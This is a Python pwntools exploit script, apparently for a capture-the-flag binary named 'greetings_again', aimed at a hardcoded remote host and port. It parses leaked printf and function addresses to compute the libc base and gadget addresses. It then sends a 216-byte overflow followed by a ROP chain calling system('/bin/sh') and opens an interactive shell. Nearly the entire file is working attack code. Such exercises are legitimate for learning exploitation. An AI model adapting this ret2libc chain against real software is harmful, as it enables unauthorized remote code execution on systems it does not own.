from sys import argv
from pwn import *

binary = './greetings_again'
host, port = '20.126.227.19:4004'.split(':')
port = int(port)

e = ELF(binary, checksec=False)         # setting pwntools context os/arch
context.os = 'linux'    # so that we won't have to specify it explicitly
context.arch = e.arch   # when using pwntools functions like asm etc.

# debug and log out
context.log_level = 'info'
info("starting exploit...")


params = ""

libc = ELF('/lib/x86_64-linux-gnu/libc.so.6',checksec=False)

# Command line arguments handling
if args['REMOTE']:
    target = remote(host, port)
    libc = ELF('./libc-2.31.so')
elif args['GDB']:
    gdbscript = args['GDB'] if args['GDB'] != 'True' else 'break *&do_test+86'
    gdbscript='''
    break greetings
    '''
    target = gdb.debug([binary,params], gdbscript=gdbscript)
else:
    target = process([binary,params])



# cylic
g = cyclic_gen()
payload = g.get(500)

payload = b'\x41' * (216)
test_pointer = b'\x42' * 8

payload = payload 


print(target.recvlines(2))

# get the leakes libc printf function
printf_leak = target.recvline()

print(printf_leak)

# get the leaked greetings function
greetings = target.recvline()
print(greetings)

# truncate and convert them
greetings = greetings[11:25]
printf_leak = printf_leak[8:22]
info("Raw printf bytes: %s" % printf_leak) 
info("Raw greetings bytes: %s" % greetings) 
leak = int(printf_leak,16)

# calculate gadgets
pop_rdi = int(greetings,16) + 217
ret = int(greetings,16) - 460

info("using pop gadget: " + str(pop_rdi))
info("using ret gadget: " + str(ret))


# get libc base adress 
libc.address = leak - libc.symbols['printf']
print("libc base: %s" % hex(libc.address))

# search bin/sh, system and exit functions
BINSH = next(libc.search(b"/bin/sh"))
SYSTEM = libc.sym["system"]
EXIT = libc.sym["exit"]

print("bin/sh %s " % BINSH)
print("system %s " % hex(SYSTEM))

# build rop chain and send payload
payload = payload + p64(pop_rdi) + p64(BINSH) + p64(ret) + p64(SYSTEM) + p64(EXIT)

print(target.sendline(payload))
target.interactive()

print(target.recvall())

